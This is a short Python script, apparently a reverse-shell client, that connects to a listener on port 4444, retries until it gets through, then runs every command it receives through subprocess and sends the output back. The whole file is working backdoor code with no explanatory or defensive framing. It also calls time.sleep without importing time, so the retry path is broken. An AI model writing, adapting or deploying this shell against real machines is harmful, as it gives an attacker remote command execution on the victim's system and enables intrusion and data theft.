import socket
import subprocess

HOST = "127.0.0.1"  # Same as listener
PORT = 4444         # Same port

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

while True:
    try:
        client.connect((HOST, PORT))
        break
    except:
        time.sleep(2)  # Retry if listener isn’t up yet

while True:
    try:
        command = client.recv(1024).decode()
        if command.lower() == "exit":
            break
        result = subprocess.getoutput(command)
        client.send(result.encode() or b"No output")
    except Exception as e:
        client.send(f"Error: {str(e)}".encode())

client.close()